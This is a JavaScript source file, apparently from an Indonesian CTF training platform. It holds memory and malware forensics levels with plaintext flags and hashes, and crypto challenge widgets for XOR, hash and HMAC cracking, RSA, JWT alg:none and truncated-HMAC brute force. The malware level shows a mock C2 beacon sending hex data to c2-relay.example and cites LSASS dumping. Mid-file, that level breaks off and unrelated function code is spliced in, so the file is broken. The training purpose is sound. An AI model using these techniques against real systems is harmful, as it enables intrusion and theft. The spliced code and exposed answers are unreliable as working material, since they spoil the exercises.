      "Baca nama file DLL yang di-load dari path nggak wajar itu.",
      "d70cb3adc316d7949c6a505caf21a50e14efd91ec1bd1533314482ee6de53606",
      "Topik: memory forensics process injection (DLL dari path tidak wajar). Jelaskan ciri process injection tanpa sebut isi flag."),
    flvl(3,"Isi Clipboard",
      `Memory dump masih nyimpen isi clipboard terakhir yang di-copy user sebelum sistem di-dump.`,
      `<div class="term">Clipboard artifact (offset 0x3A210):
<span class="hl">"jangan lupa kirim RUY{mem_l3_clipboard_capture} ke tim ops"</span></div>`,
      "Clipboard data biasanya masih 'nyangkut' di memory sampai di-overwrite copy berikutnya.",
      "Baca isi clipboard artifact-nya langsung — udah plaintext.",
      "9596f0bda9df9ff75f9823f70652667c8535dd5f1ac4b3a9c84461905fe5be34",
      "Topik: memory forensics artefak clipboard. Jelaskan kenapa clipboard bisa jadi sumber bukti tanpa sebut isi flag."),
    flvl(4,"Kredensial di Memory",
      `Proses <code>lsass.exe</code> (target favorit tool credential dumping) masih nyimpen sisa credential plaintext di memory-nya.`,
      `<div class="term">Process: lsass.exe (PID 892)
Memory region strings dump:
username: administrator
<span class="hl">password: RUY{mem_l4_credential_in_memory}</span>
domain: RUSTYCORP</div>`,
      "lsass.exe di Windows nyimpen credential cache buat autentikasi — ini target utama tool seperti Mimikatz di real attack.",
      "Baca field password di strings dump proses lsass.exe.",
      "f4bd84f9fd0fe1ec5da3acdce0280782748acc42a5ddbae6e8276b045a1bef44",
      "Topik: memory forensics kredensial plaintext di proses LSASS. Jelaskan kenapa LSASS target favorit credential dumping tanpa sebut isi flag."),
    flvl(5,"Proses Tersembunyi (Rootkit)",
      `Process list yang "kelihatan" normal (dari Task Manager) beda dengan process list hasil raw scan memory — ada SATU proses yang disembunyikan dari daftar biasa.`,
      `<div class="term">Visible process list (Task Manager): explorer.exe, chrome.exe, svchost.exe (5 instances)

Raw memory scan (EPROCESS list): explorer.exe, chrome.exe, svchost.exe (6 instances!)
<span class="hl">Hidden process found: svchost.exe (PID 7731) — cmdline: rootkit_agent RUY{mem_l5_rootkit_hidden_process}</span></div>`,
      "Bandingin jumlah proses yang 'kelihatan' vs hasil raw scan struktur memory (EPROCESS) — kalau beda, ada proses yang disembunyikan.",
      "Baca cmdline dari proses tambahan yang cuma muncul di raw scan, nggak di process list biasa.",
      "39fa95bab6069f7627e2e4fa5886b0b5637221528775b0745686400a5d204ada",
      "Topik: capstone memory forensics — hidden process/rootkit terdeteksi lewat cross-check EPROCESS list. Jelaskan teknik deteksi ini tanpa sebut isi flag."),
  ],
},

{
  id:"mal", tier:3, icon:"🦠", title:"Malware Forensics",
  materi:`<p>Malware Forensics adalah analisis artefak yang ditinggalkan malware — traffic C2, mekanisme persistence, sampai cara kerja enkripsi ransomware — TANPA harus reverse-engineer binary secara mendalam (itu ranah malware analysis/reverse engineering penuh). Fokusnya di sini: mengenali POLA dan artefak yang malware tinggalin di sistem/jaringan.</p>
  <p><b>Artefak umum yang dicari:</b></p>
  <ul>
  <li><b>Beacon C2</b> — traffic periodik dengan payload ter-encode (hex/base64) ke domain command-and-control.</li>
  <li><b>Obfuscated PowerShell</b> — command <code>powershell -enc &lt;base64&gt;</code> adalah teknik paling umum buat nyembunyiin payload berbahaya dari deteksi sederhana.</li>
  <li><b>Persistence mechanism</b> — Registry Run key, Scheduled Task, atau Service baru yang bikin malware otomatis jalan lagi setelah reboot.</li>
  <li><b>Domain Generation Algorithm (DGA)</b> — malware generate domain C2 baru tiap hari secara algoritmik, bikin blacklist domain statis nggak efektif.</li>
  <li><b>Ransomware</b> — biasanya ninggalin ransom note dan (kalau beruntung) sisa key enkripsi masih ada di memory/disk sebelum proses selesai.</li>
  </ul>
  <p><b>Tools nyata:</b> sandbox (Cuckoo, Any.run) buat dynamic analysis, <code>CyberChef</code> buat decode payload cepat.</p>`,
  levels:[
    flvl(1,"Beacon C2 Hex-Encoded",
      `Firewall log nunjukin beacon periodik dengan payload hex-encoded.`,
      `<div class="term">10:00:00 POST c2-relay.example/beacon X-Data: 5255597b6d616c
10:01:00 POST c2-relay.example/beacon X-Data: 5f6c315f6865785f

function forensicsTopicChallenges(){
  const out = [];
  for (const t of FORENSICS_TOPICS){
    for (const L of t.levels){
      out.push({
        id: t.id+"-"+L.n, cat:"forensics", tier:t.tier, topic:t.title,
        title: t.title+" — Level "+L.n+": "+L.title,
        points: L.points, scenario: L.scenario, hints: L.hints,
        flagHash: L.flagHash, aiPrimer: L.aiPrimer,
        artifact: L.artifact,
        webTopicId: null, forensicsTopicId: t.id, levelNum: L.n,
        interactive: null,
      });
    }
  }
  return out;
}

/* ======================= CRYPTOGRAPHY — TOPIC MODEL ======================= */
/* Widget berbasis 9 "kind" yang dipakai ulang lintas 40 level: XOR (byte/key),
   keystream reuse, hash/HMAC live-crack (Web Crypto), RSA decrypt (BigInt),
   MCQ click-to-identify, JWT alg:none check, HMAC truncated-tag brute force. */

const CRYPTO_PARAMS = {};

function clvl(n, title, scenario, kind, params, hint1, hint2, flagHash, aiPrimer){
  return {n, title, scenario, kind, params, hints:[hint1,hint2], flagHash, aiPrimer, points: 50 + n*50};
}

function renderCryptoWidget(id, kind, params){
  CRYPTO_PARAMS[id] = params;
  if (kind === "xorByte" || kind === "xorKey"){
    const label = kind === "xorByte" ? "Coba Key (1 byte — desimal atau hex, contoh: 90 / 0x5A)" : "Coba Key (teks)";
    return `<div class="panel"><h4>Ciphertext (hex)</h4><div class="term mono" style="word-break:break-all">${params.ct}</div>
    <h4 style="margin-top:14px">${label}</h4>
    <div class="field-row"><input type="text" id="${id}_key" placeholder="key"></div>
    <button class="primary" onclick="CW.${kind}('${id}')">Decode</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "keystreamReuse"){
    return `<div class="panel"><h4>Data</h4>
    <div class="term">plaintextA (diketahui): "${params.ptA}"
ctA (hex): ${params.ctA}
ctB (hex, mengandung flag): ${params.ctB}</div>
    <p style="font-size:13px;color:var(--text-dim);margin:10px 0">Karena ctA = plaintextA ⊕ keystream dan ctB = plaintextB ⊕ keystream (keystream SAMA), maka: plaintextB = ctA ⊕ ctB ⊕ plaintextA</p>
    <button class="primary" onclick="CW.keystreamReuse('${id}')">Hitung plaintextB</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "hashCrack" || kind === "hmacCrack"){
    const chips = params.wordlist.map(w=>`<span class="chip" onclick="CW.${kind}('${id}','${w}')">${w}</span>`).join("");
    const dataBlock = kind === "hmacCrack"
      ? `<div class="term">message: ${params.message}\ntarget HMAC-SHA256: ${params.target}</div>`
      : `<div class="term mono" style="word-break:break-all">${params.target}</div>`;
    return `<div class="panel"><h4>${kind==="hmacCrack"?"Data":"Target Hash (SHA-256)"}</h4>${dataBlock}
    <h4 style="margin-top:14px">Wordlist Kandidat</h4>
    <div class="chip-row">${chips}</div>
    <div class="field-row"><input type="text" id="${id}_custom" placeholder="atau coba sendiri"></div>
    <button class="primary" onclick="CW.${kind}('${id}',document.getElementById('${id}_custom').value)">Coba</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "rsaDecrypt"){
    return `<div class="panel"><h4>Parameter Publik</h4>
    <div class="term">n = ${params.n}
e = ${params.e}
ciphertext = [${params.cipher.join(",")}]</div>
    <h4 style="margin-top:14px">Decrypt</h4>
    <div class="field-row"><input type="text" id="${id}_d" placeholder="private exponent d"></div>
    <button class="primary" onclick="CW.rsaDecrypt('${id}')">Decrypt</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "chainRsaXor"){
    return `<div class="panel"><h4>Tahap 1 — RSA-wrapped session key</h4>
    <div class="term">n = ${params.n}
e = ${params.e}
wrapped_key = [${params.cipher.join(",")}]</div>
    <div class="field-row"><input type="text" id="${id}_d" placeholder="private exponent d"></div>
    <button class="primary" onclick="CW.chainRsaStep1('${id}')">Decrypt Session Key</button>
    <div id="${id}_out1"></div>
    <h4 style="margin-top:18px">Tahap 2 — Pesan ter-XOR pakai session key</h4>
    <div class="term mono" style="word-break:break-all">${params.ct2}</div>
    <button class="primary" onclick="CW.chainRsaStep2('${id}')" id="${id}_step2btn" disabled>Decrypt Pesan (butuh session key dari Tahap 1)</button>
    <div id="${id}_out2"></div></div>`;
  }
  if (kind === "jwtAlgNone"){
    return `<div class="panel"><h4>Simulator — JWT Verifier</h4>
    <p style="font-size:13px;color:var(--text-dim)">Server ini nge-decode JWT dan percaya field <code>alg</code> di header APAPUN isinya, termasuk kalau signature-nya kosong.</p>
    <div class="field-row"><input type="text" id="${id}_jwt" placeholder="header.payload.signature"></div>
    <button class="primary" onclick="CW.jwtAlgNone('${id}')">Verifikasi Token</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "hmacTruncBrute"){
    return `<div class="panel"><h4>Data</h4>
    <div class="term">key (diketahui): ${params.key}
message space: ORDER-0 .. ORDER-${params.range}
target truncated tag (1 byte / 2 hex char): ${params.targetPrefix}</div>
    <p style="font-size:13px;color:var(--text-dim);margin:10px 0">Tag di-truncate jadi cuma 1 byte — attacker nggak perlu tau message ASLI, cukup cari SATU message apapun yang truncated tag-nya cocok.</p>
    <button class="primary" onclick="CW.hmacTruncBrute('${id}')" id="${id}_btn">Brute Force</button>
    <div id="${id}_out"></div></div>`;
  }
  if (kind === "mcq"){
    const btns = params.options.map((o,i)=>`<button class="mcq-opt" onclick="CW.mcq('${id}',${i})"><span class="mcq-opt-mark">${String.fromCharCode(65+i)}</span>${o.label}</button>`).join("");
    return `<div class="panel"><h4>${params.question||"Pilih yang paling tepat"}</h4>
    <div class="mcq-options">${btns}</div>
    <div id="${id}_code" class="term" style="min-height:60px;margin-top:12px"></div>
    <div id="${id}_out"></div></div>`;
  }
  return "";
}

const CW = {
  parseByteKey(v){
    v = v.trim();
    if (/^0x/i.test(v)) return parseInt(v,16);
    if (/^[0-9a-f]{1,2}$/i.test(v) && v.length<=2 && /[a-f]/i.test(v)) return parseInt(v,16);
    return parseInt(v,10);
  },
  xorByte(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    const kb = CW.parseByteKey(byId(id+"_key").value);
    if (isNaN(kb) || kb<0 || kb>255){ el.innerHTML = `<div class="result-line bad">Key harus 0-255.</div>`; return; }
    const dec = xorHexWithAsciiKey(p.ct, String.fromCharCode(kb));
    const ok = /^RUY\{.*\}$/.test(dec);
    el.innerHTML = `<div class="result-line ${ok?'ok':'bad'}">Hasil: <b>${escapeHtml(dec)}</b></div>`;
    if (ok) autofillFlag(id, dec);
  },
  xorKey(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    const key = byId(id+"_key").value;
    if (!key){ el.innerHTML = `<div class="result-line bad">Masukin key dulu.</div>`; return; }
    const dec = xorHexWithAsciiKey(p.ct, key);
    const ok = /^RUY\{.*\}$/.test(dec);
    el.innerHTML = `<div class="result-line ${ok?'ok':'bad'}">Hasil: <b>${escapeHtml(dec)}</b></div>`;
    if (ok) autofillFlag(id, dec);
  },
  keystreamReuse(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    const res = xorHexHexHex(p.ctA, p.ctB, p.ptA);
    const ok = /^RUY\{.*\}$/.test(res);
    el.innerHTML = `<div class="result-line ${ok?'ok':'bad'}">plaintextB = <b>${escapeHtml(res)}</b></div>`;
    if (ok) autofillFlag(id, res);
  },
  async hashCrack(id, candidate){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    if (!candidate) return;
    el.innerHTML = `<div class="result-line bad">Menghitung SHA-256...</div>`;
    const h = await sha256Hex((p.saltPrefix||"")+candidate);
    if (h === p.target){
      el.innerHTML = `<div class="result-line ok">✅ Match! Password: <b>${escapeHtml(candidate)}</b><br>Flag: <b>${p.flag}</b></div>`;
      autofillFlag(id, p.flag);
    } else el.innerHTML = `<div class="result-line bad">❌ "${escapeHtml(candidate)}" ≠ target.</div>`;
  },
  async hmacCrack(id, candidate){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    if (!candidate) return;
    el.innerHTML = `<div class="result-line bad">Menghitung HMAC...</div>`;
    const h = await hmacSha256Hex(candidate, p.message);
    if (h === p.target){
      el.innerHTML = `<div class="result-line ok">✅ Match! Secret: <b>${escapeHtml(candidate)}</b><br>Flag: <b>${p.flag}</b></div>`;
      autofillFlag(id, p.flag);
    } else el.innerHTML = `<div class="result-line bad">❌ HMAC dengan "${escapeHtml(candidate)}" ≠ target.</div>`;
  },
  rsaDecrypt(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    const d = byId(id+"_d").value.trim();
    if (!/^\d+$/.test(d)){ el.innerHTML = `<div class="result-line bad">Masukin d berupa angka.</div>`; return; }
    let out = "";
    for (const c of p.cipher) out += String.fromCharCode(Number(modexpBig(c, d, p.n)));
    const ok = /^RUY\{.*\}$/.test(out);
    el.innerHTML = `<div class="result-line ${ok?'ok':'bad'}">Decrypted: <b>${escapeHtml(out)}</b></div>`;
    if (ok) autofillFlag(id, out);
  },
  chainRsaStep1(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out1");
    const d = byId(id+"_d").value.trim();
    if (!/^\d+$/.test(d)){ el.innerHTML = `<div class="result-line bad">Masukin d berupa angka.</div>`; return; }
    let out = "";
    for (const c of p.cipher) out += String.fromCharCode(Number(modexpBig(c, d, p.n)));
    el.innerHTML = `<div class="result-line ok">Session key: <b>${escapeHtml(out)}</b></div>`;
    p._recoveredKey = out;
    const btn = byId(id+"_step2btn"); if (btn) btn.disabled = false;
  },
  chainRsaStep2(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out2");
    if (!p._recoveredKey){ el.innerHTML = `<div class="result-line bad">Selesaikan Tahap 1 dulu.</div>`; return; }
    const dec = xorHexWithAsciiKey(p.ct2, p._recoveredKey);
    const ok = /^RUY\{.*\}$/.test(dec);
    el.innerHTML = `<div class="result-line ${ok?'ok':'bad'}">Pesan: <b>${escapeHtml(dec)}</b></div>`;
    if (ok) autofillFlag(id, dec);
  },
  jwtAlgNone(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out");
    const v = byId(id+"_jwt").value.trim();
    const parts = v.split(".");
    if (parts.length !== 3){ el.innerHTML = `<div class="result-line bad">Format JWT harus 3 bagian dipisah titik.</div>`; return; }
    try {
      const b64 = parts[0].replace(/-/g,"+").replace(/_/g,"/");
      const header = atob(b64);
      if (/"alg"\s*:\s*"none"/i.test(header)){
        el.innerHTML = `<div class="result-line ok">✅ Token diterima tanpa verifikasi signature! Flag: <b>${p.flag}</b></div>`;
        autofillFlag(id, p.flag);
      } else {
        el.innerHTML = `<div class="result-line bad">Header: ${escapeHtml(header)} — signature tetap diverifikasi.</div>`;
      }
    } catch(e){ el.innerHTML = `<div class="result-line bad">Header nggak valid base64.</div>`; }
  },
  async hmacTruncBrute(id){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out"); const btn = byId(id+"_btn");
    btn.disabled = true; el.innerHTML = `<div class="result-line bad">Brute forcing...</div>`;
    for (let i=0;i<=p.range;i++){
      const msg = "ORDER-"+i;
      const h = await hmacSha256Hex(p.key, msg);
      if (h.slice(0,2) === p.targetPrefix){
        el.innerHTML = `<div class="result-line ok">✅ Ketemu! "${msg}" punya truncated tag yang sama (${p.targetPrefix}) walau bukan message asli.<br>Flag: <b>${p.flag}</b></div>`;
        autofillFlag(id, p.flag);
        btn.disabled = false;
        return;
      }
    }
    el.innerHTML = `<div class="result-line bad">Nggak ketemu di range ini.</div>`;
    btn.disabled = false;
  },
  mcq(id, idx){
    const p = CRYPTO_PARAMS[id]; const el = byId(id+"_out"); const codeEl = byId(id+"_code");
    const opt = p.options[idx];
    codeEl.innerHTML = opt.code || "";
    if (opt.correct){
      el.innerHTML = `<div class="result-line ok">✅ ${opt.explain}<br>Flag: <b>${p.flag}</b></div>`;
      autofillFlag(id, p.flag);
    } else {
      el.innerHTML = `<div class="result-line bad">${opt.explain||'Kurang tepat, coba lagi.'}</div>`;
    }
  },
};
